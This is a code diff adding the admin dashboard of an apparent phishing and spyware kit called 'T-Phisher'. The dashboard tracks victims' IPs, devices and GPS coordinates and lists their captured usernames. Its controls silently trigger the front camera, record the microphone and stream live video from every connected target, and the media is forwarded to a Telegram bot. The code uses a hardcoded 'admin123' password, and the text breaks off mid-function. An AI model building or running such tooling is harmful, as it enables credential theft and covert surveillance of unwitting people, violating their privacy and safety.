@@ -1,0 +1,1235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>T-Phisher — Admin Panel</title>
+  <meta name="description" content="T-Phisher Admin Dashboard">
+  <link rel="stylesheet" href="/admin.css">
+</head>
+<body>
+
+<!-- ═══════════════════════════════════════════════════════════════
+     LOGIN SCREEN
+═══════════════════════════════════════════════════════════════ -->
+<div id="login-screen">
+  <div class="login-bg-grid"></div>
+  <div class="login-bg-radial"></div>
+
+  <div class="login-card">
+    <div class="login-logo">
+      <div class="login-logo-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 2L2 7l10 5 10-5-10-5z"/>
+          <path d="M2 17l10 5 10-5"/>
+          <path d="M2 12l10 5 10-5"/>
+        </svg>
+      </div>
+      <h1>T-PHISHER</h1>
+      <p>Secure Admin Dashboard</p>
+    </div>
+
+    <div class="login-field">
+      <label for="admin-password">Access Key</label>
+      <input type="password" id="admin-password" placeholder="Enter admin password" autocomplete="off" autofocus>
+    </div>
+
+    <button class="login-btn" id="login-btn" onclick="attemptLogin()">
+      AUTHENTICATE
+    </button>
+
+    <div class="login-error" id="login-error">
+      ⚠ Invalid access key. Access denied.
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════
+     DASHBOARD
+═══════════════════════════════════════════════════════════════ -->
+<div id="dashboard">
+
+  <!-- Header -->
+  <header class="header">
+    <div class="header-logo">
+      <div class="header-logo-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 2L2 7l10 5 10-5-10-5z"/>
+          <path d="M2 17l10 5 10-5"/>
+          <path d="M2 12l10 5 10-5"/>
+        </svg>
+      </div>
+      <span class="header-logo-text">T-PHISHER</span>
+      <span class="header-logo-version">v2.0</span>
+    </div>
+
+    <div class="header-divider"></div>
+
+    <div class="header-stats">
+      <div class="header-stat">
+        <span class="dot green"></span>
+        <span>LIVE</span>
+        <span class="value" id="hdr-live">0</span>
+        <span>targets</span>
+      </div>
+      <div class="header-divider"></div>
+      <div class="header-stat">
+        <span class="dot cyan"></span>
+        <span>Credentials:</span>
+        <span class="value" id="hdr-creds">0</span>
+      </div>
+      <div class="header-divider"></div>
+      <div class="header-stat">
+        <span class="dot purple"></span>
+        <span>Media:</span>
+        <span class="value" id="hdr-media">0</span>
+      </div>
+      <div class="header-divider"></div>
+      <div class="header-stat">
+        <span class="dot orange"></span>
+        <span>Alerts:</span>
+        <span class="value" id="hdr-alerts">0</span>
+      </div>
+    </div>
+
+    <div class="header-right">
+      <span class="header-time" id="header-clock">00:00:00</span>
+      <button class="btn-logout" onclick="logout()">LOGOUT</button>
+    </div>
+  </header>
+
+  <!-- Navigation Tabs -->
+  <nav class="nav-tabs">
+    <button class="tab-btn active" id="tab-overview" onclick="switchTab('overview')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+      Overview
+    </button>
+    <button class="tab-btn" id="tab-users" onclick="switchTab('users')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+      Live Users
+      <span class="tab-badge" id="badge-users">0</span>
+    </button>
+    <button class="tab-btn" id="tab-activity" onclick="switchTab('activity')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+      Activity
+      <span class="tab-badge red" id="badge-activity">0</span>
+    </button>
+    <button class="tab-btn" id="tab-media" onclick="switchTab('media')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+      Media
+      <span class="tab-badge" id="badge-media">0</span>
+    </button>
+    <button class="tab-btn" id="tab-credentials" onclick="switchTab('credentials')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      Credentials
+      <span class="tab-badge red" id="badge-creds">0</span>
+    </button>
+    <button class="tab-btn" id="tab-controls" onclick="switchTab('controls')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M4.93 4.93a10 10 0 0 0 0 14.14"/></svg>
+      Controls
+    </button>
+    <button class="tab-btn" id="tab-camera" onclick="switchTab('camera')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 7 16 12l7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
+      Live Camera
+      <span class="tab-badge red" id="badge-camera" style="display:none">LIVE</span>
+    </button>
+  </nav>
+
+  <!-- Content Area -->
+  <div class="content">
+
+    <!-- ─── TAB: OVERVIEW ──────────────────────────────────────────── -->
+    <div class="tab-panel active" id="panel-overview">
+
+      <!-- Stat Cards -->
+      <div class="stat-grid">
+        <div class="stat-card cyan">
+          <div class="stat-label">Active Targets</div>
+          <div class="stat-value" id="stat-live">0</div>
+          <div class="stat-sub">Live connections</div>
+        </div>
+        <div class="stat-card green">
+          <div class="stat-label">Credentials</div>
+          <div class="stat-value" id="stat-creds">0</div>
+          <div class="stat-sub">Total captured</div>
+        </div>
+        <div class="stat-card purple">
+          <div class="stat-label">Media Files</div>
+          <div class="stat-value" id="stat-media">0</div>
+          <div class="stat-sub">Photos &amp; audio</div>
+        </div>
+        <div class="stat-card orange">
+          <div class="stat-label">TG Alerts</div>
+          <div class="stat-value" id="stat-alerts">0</div>
+          <div class="stat-sub">Sent to Telegram</div>
+        </div>
+        <div class="stat-card red">
+          <div class="stat-label">Activity</div>
+          <div class="stat-value" id="stat-activity">0</div>
+          <div class="stat-sub">Total events</div>
+        </div>
+      </div>
+
+      <div class="grid-2">
+        <!-- Quick Users -->
+        <div class="panel">
+          <div class="panel-header">
+            <div class="panel-title">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/></svg>
+              Connected Targets
+            </div>
+          </div>
+          <div id="overview-users">
+            <div class="empty-state"><div class="icon">📡</div><p>No active targets</p></div>
+          </div>
+        </div>
+
+        <!-- Quick Activity -->
+        <div class="panel">
+          <div class="panel-header">
+            <div class="panel-title">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+              Recent Activity
+            </div>
+          </div>
+          <div class="activity-feed" id="overview-activity">
+            <div class="empty-state"><div class="icon">⚡</div><p>No activity yet</p></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── TAB: LIVE USERS ───────────────────────────────────────── -->
+    <div class="tab-panel" id="panel-users">
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+            Live Connected Targets
+          </div>
+          <div class="panel-actions">
+            <button class="btn-action" onclick="requestFromAll('photo')">📸 Photo All</button>
+            <button class="btn-action" onclick="requestFromAll('audio')">🎙 Audio All</button>
+            <button class="btn-action" onclick="refreshLocation()">📍 Refresh Location</button>
+          </div>
+        </div>
+        <div class="table-wrap">
+          <table id="users-table">
+            <thead>
+              <tr>
+                <th>#</th>
+                <th>IP Address</th>
+                <th>Browser</th>
+                <th>OS</th>
+                <th>Device</th>
+                <th>Location</th>
+                <th>Connected</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody id="users-tbody">
+              <tr>
+                <td colspan="8">
+                  <div class="empty-state"><div class="icon">📡</div><p>No targets connected yet</p></div>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── TAB: ACTIVITY ─────────────────────────────────────────── -->
+    <div class="tab-panel" id="panel-activity">
+      <div class="panel" style="height: calc(100vh - 180px); display: flex; flex-direction: column;">
+        <div class="panel-header">
+          <div class="panel-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+            Real-time Activity Feed
+          </div>
+          <div class="panel-actions">
+            <button class="btn-action" onclick="clearActivity()">Clear Feed</button>
+          </div>
+        </div>
+        <div class="activity-feed" id="activity-feed" style="max-height: none; flex: 1; overflow-y: auto;">
+          <div class="empty-state" id="activity-empty"><div class="icon">⚡</div><p>Monitoring for activity...</p></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── TAB: MEDIA ────────────────────────────────────────────── -->
+    <div class="tab-panel" id="panel-media">
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+            Captured Media Gallery
+          </div>
+          <div class="panel-actions">
+            <span class="text-muted text-sm" id="media-count">0 files</span>
+          </div>
+        </div>
+        <div id="media-gallery">
+          <div class="media-empty" id="media-empty">
+            <div class="icon">🖼</div>
+            <p>No media captured yet.<br>Use the Controls tab to request photos or audio.</p>
+          </div>
+          <div class="media-grid" id="media-grid"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── TAB: CREDENTIALS ──────────────────────────────────────── -->
+    <div class="tab-panel" id="panel-credentials">
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            Captured Credentials
+          </div>
+        </div>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>#</th>
+                <th>Username / Email</th>
+                <th>IP Address</th>
+                <th>Date</th>
+                <th>Time</th>
+              </tr>
+            </thead>
+            <tbody id="creds-tbody">
+              <tr>
+                <td colspan="5">
+                  <div class="empty-state"><div class="icon">🔑</div><p>No credentials captured yet</p></div>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── TAB: CONTROLS ─────────────────────────────────────────── -->
+    <div class="tab-panel" id="panel-controls">
+
+      <div style="margin-bottom: 12px; font-size: 12px; color: var(--text-muted);">
+        Commands are sent to ALL connected targets unless otherwise specified. Media is auto-forwarded to your Telegram bot.
+      </div>
+
+      <div class="ctrl-grid">
+
+        <!-- Request Photo -->
+        <div class="ctrl-card cyan" onclick="requestFromAll('photo')" id="ctrl-photo">
+          <div class="ctrl-card-icon">📸</div>
+          <div class="ctrl-card-title">Request Photo</div>
+          <div class="ctrl-card-desc">Silently triggers front camera capture on all connected target devices. Photo is forwarded to Telegram.</div>
+        </div>
+
+        <!-- Request Audio -->
+        <div class="ctrl-card purple" onclick="requestFromAll('audio')" id="ctrl-audio">
+          <div class="ctrl-card-icon">🎙️</div>
+          <div class="ctrl-card-title">Record Audio</div>
+          <div class="ctrl-card-desc">Records a 6-second audio clip from all connected target microphones. Audio is forwarded to Telegram.</div>
+        </div>
+
+        <!-- Get Location -->
+        <div class="ctrl-card green" onclick="refreshLocation()" id="ctrl-location">
+          <div class="ctrl-card-icon">📍</div>
+          <div class="ctrl-card-title">Refresh Location</div>
+          <div class="ctrl-card-desc">Requests a fresh GPS location update from all active targets. Updates the Live Users table.</div>
+        </div>
+
+        <!-- Send Alert -->
+        <div class="ctrl-card red" onclick="openAlertModal()" id="ctrl-alert">
+          <div class="ctrl-card-icon">🚨</div>
+          <div class="ctrl-card-title">Send Alert to Telegram</div>
+          <div class="ctrl-card-desc">Compose and send a custom text alert message directly to your Telegram bot immediately.</div>
+        </div>
+
+        <!-- Quick Credential Summary -->
+        <div class="ctrl-card orange" onclick="switchTab('credentials')">
+          <div class="ctrl-card-icon">🔑</div>
+          <div class="ctrl-card-title">View Credentials</div>
+          <div class="ctrl-card-desc">Navigate to the credentials log to see all captured usernames and passwords with IPs and timestamps.</div>
+        </div>
+
+      </div>
+
+      <!-- Status Log -->
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+            Command Status
+          </div>
+        </div>
+        <div class="ctrl-status-panel" id="ctrl-status">
+          <div class="ctrl-status-line">[system] Control panel initialized. WebSocket connected.</div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- ─── TAB: LIVE CAMERA ──────────────────────────────────────────── -->
+    <div class="tab-panel" id="panel-camera">
+      <div class="camera-grid" id="camera-grid">
+        <div class="camera-placeholder" id="camera-grid-empty" style="grid-column: 1 / -1; min-height: 250px; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+          <div class="camera-placeholder-icon">📹</div>
+          <p>No active targets connected</p>
+          <p class="camera-placeholder-sub">Waiting for targets to connect...</p>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════
+     ALERT MODAL
+═══════════════════════════════════════════════════════════════ -->
+<div class="modal-backdrop" id="alert-modal">
+  <div class="modal">
+    <div class="modal-title">🚨 Send Telegram Alert</div>
+    <div class="modal-desc">Type a custom message to send directly to your Telegram bot. Use this for status reports or manual notifications.</div>
+    <textarea class="modal-input" id="alert-text" placeholder="Enter your alert message here..."></textarea>
+    <div class="modal-actions">
+      <button class="btn-secondary" onclick="closeAlertModal()">Cancel</button>
+      <button class="btn-primary" onclick="sendAlert()">Send to Telegram 🚀</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════
+     PHOTO LIGHTBOX
+═══════════════════════════════════════════════════════════════ -->
+<div class="lightbox" id="lightbox" onclick="closeLightbox()">
+  <button class="lightbox-close" onclick="closeLightbox()">✕</button>
+  <img src="" alt="Captured photo" id="lightbox-img">
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════
+     JAVASCRIPT
+═══════════════════════════════════════════════════════════════ -->
+<script>
+// ─── Configuration ────────────────────────────────────────────────
+const ADMIN_PASSWORD = 'admin123'; // Change this to your desired password
+
+// ─── State ────────────────────────────────────────────────────────
+let ws = null;
+let isConnected = false;
+let targets     = {};   // clientId -> userInfo
+let activityLog = [];
+let mediaItems  = [];
+let credLogs    = [];
+let alertCount  = 0;
+let activeTab   = 'overview';
+
+// ─── Login ────────────────────────────────────────────────────────
+document.getElementById('admin-password').addEventListener('keydown', e => {
+  if (e.key === 'Enter') attemptLogin();
+});
+
+function attemptLogin(bypassPass) {
+  const pass = bypassPass || document.getElementById('admin-password').value;
+  const errEl = document.getElementById('login-error');
+  if (pass === ADMIN_PASSWORD) {
+    localStorage.setItem('adminPassword', pass);
+    errEl.classList.remove('show');
+    document.getElementById('login-screen').style.display = 'none';
+    document.getElementById('dashboard').classList.add('visible');
+    initWebSocket();
+    startClock();
+  } else {
+    errEl.classList.remove('show');
+    void errEl.offsetWidth; // force reflow for animation replay
+    errEl.classList.add('show');
+    document.getElementById('admin-password').value = '';
+    document.getElementById('admin-password').focus();
+  }
+}
+
+function logout() {
+  if (ws) ws.close();
+  localStorage.removeItem('adminPassword');
+  document.getElementById('dashboard').classList.remove('visible');
+  document.getElementById('login-screen').style.display = 'flex';
+  document.getElementById('admin-password').value = '';
+}
+
+// ─── Clock ────────────────────────────────────────────────────────
+function startClock() {
+  function tick() {
+    const now = new Date();
+    document.getElementById('header-clock').textContent =
+      now.toLocaleTimeString('en-US', { hour12: false });
+  }
+  tick();
+  setInterval(tick, 1000);
+}
+
+// ─── WebSocket ────────────────────────────────────────────────────
+function initWebSocket() {
+  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+  ws = new WebSocket(`${proto}//${location.host}`);
+
+  ws.onopen = () => {
+    isConnected = true;
+    ws.send(JSON.stringify({ type: 'join_admin' }));
+    addCtrlStatus('[connected] WebSocket connected to server.');
+  };
+
+  ws.onmessage = (evt) => {
+    let msg;
+    try { msg = JSON.parse(evt.data); } catch { return; }
+    handleMessage(msg);
+  };
+
+  ws.onclose = () => {
+    isConnected = false;
+    addCtrlStatus('[disconnected] WebSocket closed. Reconnecting in 3s...', true);
+    setTimeout(initWebSocket, 3000);
+  };
+
+  ws.onerror = () => {
+    addCtrlStatus('[error] WebSocket error occurred.', true);
+  };
+}
+
+function sendWS(data) {
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify(data));
+    return true;
+  }
+  addCtrlStatus('[error] Not connected to server.', true);
+  return false;
+}
+
+// ─── Message Handler ──────────────────────────────────────────────
+function handleMessage(msg) {
+  switch (msg.type) {
+
+    case 'INIT': {
+      credLogs   = msg.logs      || [];
+      activityLog = msg.activity || [];
+      alertCount  = msg.alertsSent || 0;
+      // Populate targets
+      (msg.targets || []).forEach(t => { targets[t.clientId] = t; });
+      // Populate media
+      (msg.media || []).forEach(m => {
+        if (!mediaItems.find(x => x.id === m.id)) mediaItems.push(m);
+      });
+      refreshAll();
+      break;
+    }
+
+    case 'TARGET_CONNECTED': {
+      targets[msg.user.clientId] = msg.user;
+      refreshUsersPanel();
+      updateHeaderStats();
+      break;
+    }
+
+    case 'TARGET_DISCONNECTED': {
+      // Auto-stop live camera if the streamed target disconnects
+      if (activeCameraStreams[msg.clientId]) {
+        stopCameraStream(msg.clientId);
+        addCtrlStatus(`[camera] ⚠️ Streaming target #${msg.clientId} disconnected. Stream stopped.`, true);
+      }
+      delete targets[msg.clientId];
+      refreshUsersPanel();
+      updateHeaderStats();
+      break;
+    }
+
+    case 'LOCATION_UPDATE': {
+      if (targets[msg.clientId]) {
+        targets[msg.clientId].location = { lat: msg.lat, lng: msg.lng, accuracy: msg.accuracy };
+        refreshUsersPanel();
+      }
+      break;
+    }
+
+    case 'NEW_LOG': {
+      credLogs.unshift(msg.log);
+      refreshCredsPanel();
+      updateHeaderStats();
+      break;
+    }
+
+    case 'NEW_MEDIA': {
+      mediaItems.unshift(msg.media);
+      renderMediaItem(msg.media, true);
+      updateHeaderStats();
+      updateBadge('media', mediaItems.length);
+      break;
+    }
+
+    case 'ACTIVITY': {
+      addActivityItem(msg.entry);
+      break;
+    }
+
+    case 'ALERT_SENT': {
+      alertCount = msg.alertsSent;
+      updateHeaderStats();
+      break;
+    }
+
+    case 'CAMERA_FRAME': {
+      receiveCameraFrame(msg);
+      break;
+    }
+
+    case 'AUDIO_CHUNK': {
+      receiveAudioChunk(msg);
+      break;
+    }
+  }
+}
+
+// ─── Refresh All ──────────────────────────────────────────────────
+function refreshAll() {
+  refreshUsersPanel();
+  refreshActivityPanel();
+  refreshMediaPanel();
+  refreshCredsPanel();
+  updateHeaderStats();
+}
+
+// ─── Users Panel ──────────────────────────────────────────────────
+function refreshUsersPanel() {
+  const targetList = Object.values(targets);
+  const count = targetList.length;
+
+  updateBadge('users', count);
+  updateStat('stat-live', count);
+
+  // Overview quick list
+  const ovEl = document.getElementById('overview-users');
+  if (count === 0) {
+    ovEl.innerHTML = '<div class="empty-state"><div class="icon">📡</div><p>No active targets</p></div>';
+  } else {
+    ovEl.innerHTML = `<div class="table-wrap"><table><thead><tr>
+      <th>IP</th><th>Browser</th><th>OS</th><th>Location</th></tr></thead>
+      <tbody>${targetList.slice(0, 5).map(t => `
+        <tr>
+          <td class="ip-text">${t.ip}</td>
+          <td><span class="tag cyan">${t.browser}</span></td>
+          <td>${t.os}</td>
+          <td class="loc-text">${t.location ? `${t.location.lat.toFixed(4)}, ${t.location.lng.toFixed(4)}` : '—'}</td>
+        </tr>`).join('')}
+      </tbody></table></div>`;
+  }
+
+  // Full table
+  const tbody = document.getElementById('users-tbody');
+  if (count === 0) {
+    tbody.innerHTML = `<tr><td colspan="8"><div class="empty-state"><div class="icon">📡</div><p>No targets connected yet</p></div></td></tr>`;
+    return;
+  }
+
+  tbody.innerHTML = targetList.map(t => `
+    <tr>
+      <td style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)">#${t.clientId}</td>
+      <td class="ip-text">${t.ip}</td>
+      <td><span class="tag cyan">${t.browser}</span></td>
+      <td><span class="tag purple">${t.os}</span></td>
+      <td><span class="tag ${t.device === 'Mobile' ? 'green' : ''}">${t.device}</span></td>
+      <td class="loc-text">${t.location ? `<a href="https://www.google.com/maps?q=${t.location.lat},${t.location.lng}" target="_blank" style="color:var(--green-dim)">${t.location.lat.toFixed(4)}, ${t.location.lng.toFixed(4)}</a>` : '<span style="color:var(--text-dim)">—</span>'}</td>
+      <td style="font-size:11px;color:var(--text-muted);font-family:var(--font-mono)">${fmtTime(t.connectedAt)}</td>
+      <td>
+        <div class="action-btns">
+          <button class="btn-action photo" onclick="requestFrom(${t.clientId}, 'photo')">📸 Photo</button>
+          <button class="btn-action audio" onclick="requestFrom(${t.clientId}, 'audio')">🎙 Audio</button>
+        </div>
+      </td>
+    </tr>
+  `).join('');
+
+  // Keep camera grid in sync
+  refreshCameraGrid();
+}
+
+// ─── Activity Panel ───────────────────────────────────────────────
+function refreshActivityPanel() {
+  // Full feed
+  const feed = document.getElementById('activity-feed');
+  const empty = document.getElementById('activity-empty');
+
+  if (activityLog.length === 0) {
+    empty.style.display = '';
+    updateBadge('activity', 0);
+    return;
+  }
+
+  empty.style.display = 'none';
+  const existing = new Set([...feed.querySelectorAll('.activity-item')].map(el => el.dataset.ts));
+  activityLog.forEach(entry => {
+    if (!existing.has(entry.timestamp)) {
+      feed.insertAdjacentHTML('afterbegin', buildActivityHTML(entry));
+    }
+  });
+
+  // Overview quick feed
+  const ovFeed = document.getElementById('overview-activity');
+  ovFeed.innerHTML = activityLog.slice(0, 8).map(e => buildActivityHTML(e)).join('');
+  if (ovFeed.innerHTML === '') {
+    ovFeed.innerHTML = '<div class="empty-state"><div class="icon">⚡</div><p>No activity yet</p></div>';
+  }
+
+  updateBadge('activity', activityLog.length);
+  updateStat('stat-activity', activityLog.length);
+}
+
+function addActivityItem(entry) {
+  activityLog.unshift(entry);
+  const feed = document.getElementById('activity-feed');
+  const empty = document.getElementById('activity-empty');
+  empty.style.display = 'none';
+  feed.insertAdjacentHTML('afterbegin', buildActivityHTML(entry));
+
+  // Overview quick feed
+  const ovFeed = document.getElementById('overview-activity');
+  const existing = ovFeed.querySelector('.empty-state');
+  if (existing) existing.remove();
+  const items = ovFeed.querySelectorAll('.activity-item');
+  if (items.length >= 8) items[items.length - 1].remove();
+  ovFeed.insertAdjacentHTML('afterbegin', buildActivityHTML(entry));
+
+  updateBadge('activity', activityLog.length);
+  updateStat('stat-activity', activityLog.length);
+}
+
+function buildActivityHTML(entry) {
+  return `<div class="activity-item" data-ts="${entry.timestamp}">
+    <span class="activity-dot ${entry.type}"></span>
+    <div class="activity-body">
+      <div class="activity-msg">${entry.message}</div>
+      <div class="activity-time">${fmtDateTime(entry.timestamp)}</div>
+    </div>
+  </div>`;
+}
+
+function clearActivity() {
+  activityLog = [];
+  document.getElementById('activity-feed').innerHTML = '';
+  document.getElementById('activity-empty').style.display = '';
+  document.getElementById('overview-activity').innerHTML = '<div class="empty-state"><div class="icon">⚡</div><p>No activity yet</p></div>';
+  updateBadge('activity', 0);
+  updateStat('stat-activity', 0);
+}
+
+// ─── Media Panel ──────────────────────────────────────────────────
+function refreshMediaPanel() {
+  const grid = document.getElementById('media-grid');
+  const empty = document.getElementById('media-empty');
+  grid.innerHTML = '';
+  if (mediaItems.length === 0) {
+    empty.style.display = '';
+    return;
+  }
+  empty.style.display = 'none';
+  mediaItems.forEach(m => renderMediaItem(m, false));
+  document.getElementById('media-count').textContent = `${mediaItems.length} file${mediaItems.length !== 1 ? 's' : ''}`;
+  updateStat('stat-media', mediaItems.length);
+}
+
+function renderMediaItem(item, prepend) {
+  const grid  = document.getElementById('media-grid');
+  const empty = document.getElementById('media-empty');
+  empty.style.display = 'none';
+
+  const ts = fmtDateTime(item.timestamp);
+  let html = '';
+
+  if (item.type === 'photo') {
+    html = `<div class="media-card" id="media-${item.id}">
+      <img class="media-card-img" src="${item.data}" alt="Captured photo" onclick="openLightbox('${item.data}')">
+      <div class="media-card-meta">
+        <span class="media-badge photo">PHOTO</span>
+        <span>${item.ip} — ${ts}</span>
+      </div>
+    </div>`;
+  } else {
+    html = `<div class="media-card" id="media-${item.id}">
+      <div class="media-card-audio">
+        <div class="audio-icon">🎙️</div>
+        <audio controls src="${item.data}"></audio>
+      </div>
+      <div class="media-card-meta">
+        <span class="media-badge audio">AUDIO</span>
+        <span>${item.ip} — ${ts}</span>
+      </div>
+    </div>`;
+  }
+
+  if (prepend) {
+    grid.insertAdjacentHTML('afterbegin', html);
+  } else {
+    grid.insertAdjacentHTML('beforeend', html);
+  }
+
+  document.getElementById('media-count').textContent = `${mediaItems.length} file${mediaItems.length !== 1 ? 's' : ''}`;
+  updateStat('stat-media', mediaItems.length);
+}
+
+// ─── Credentials Panel ────────────────────────────────────────────
+function refreshCredsPanel() {
+  const tbody = document.getElementById('creds-tbody');
+  updateBadge('creds', credLogs.length);
+  updateStat('stat-creds', credLogs.length);
+
+  if (credLogs.length === 0) {
+    tbody.innerHTML = `<tr><td colspan="5"><div class="empty-state"><div class="icon">🔑</div><p>No credentials captured yet</p></div></td></tr>`;
+    return;
+  }
+
+  tbody.innerHTML = credLogs.map(l => `
+    <tr>
+      <td style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)">#${l.id}</td>
+      <td style="font-weight:600">${escapeHtml(l.username)}</td>
+      <td class="ip-text">${l.ip}</td>
+      <td style="font-size:11px;color:var(--text-muted)">${l.date}</td>
+      <td style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)">${l.time}</td>
+    </tr>
+  `).join('');
+}
+
+// ─── Header Stats ─────────────────────────────────────────────────
+function updateHeaderStats() {
+  const targetCount = Object.keys(targets).length;
+  updateEl('hdr-live',   targetCount);
+  updateEl('hdr-creds',  credLogs.length);
+  updateEl('hdr-media',  mediaItems.length);
+  updateEl('hdr-alerts', alertCount);
+  updateStat('stat-live',    targetCount);
+  updateStat('stat-creds',   credLogs.length);
+  updateStat('stat-media',   mediaItems.length);
+  updateStat('stat-alerts',  alertCount);
+}
+
+// ─── Tab Navigation ───────────────────────────────────────────────
+function switchTab(name) {
+  activeTab = name;
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+  document.getElementById('tab-'    + name)?.classList.add('active');
+  document.getElementById('panel-'  + name)?.classList.add('active');
+}
+
+// ─── Commands ─────────────────────────────────────────────────────
+function requestFromAll(type) {
+  if (sendWS({ type: `request_${type}` })) {
+    addCtrlStatus(`[cmd] ${type === 'photo' ? '📸' : '🎙️'} ${type} request sent to ALL targets.`);
+    flashCard(`ctrl-${type}`);
+  }
+}
+
+function requestFrom(clientId, type) {
+  if (sendWS({ type: `request_${type}`, targetId: clientId })) {
+    addCtrlStatus(`[cmd] ${type} request sent to target #${clientId}.`);
+  }
+}
+
+function refreshLocation() {
+  if (sendWS({ type: 'get_location' })) {
+    addCtrlStatus('[cmd] 📍 Location refresh requested from all targets.');
+    flashCard('ctrl-location');
+  }
+}
+
+function openAlertModal() {
+  document.getElementById('alert-modal').classList.add('open');
+  document.getElementById('alert-text').focus();
+}
+
+function closeAlertModal() {
+  document.getElementById('alert-modal').classList.remove('open');
+  document.getElementById('alert-text').value = '';
+}
+
+function sendAlert() {
+  const msg = document.getElementById('alert-text').value.trim();
+  if (!msg) return;
+  if (sendWS({ type: 'send_alert', message: msg })) {
+    addCtrlStatus(`[telegram] 🚨 Alert sent: "${msg}"`);
+    alertCount++;
+    updateHeaderStats();
+  }
+  closeAlertModal();
+}
+
+// ─── Lightbox ─────────────────────────────────────────────────────
+function openLightbox(src) {
+  document.getElementById('lightbox-img').src = src;
+  document.getElementById('lightbox').classList.add('open');
+}
+
+function closeLightbox() {
+  document.getElementById('lightbox').classList.remove('open');
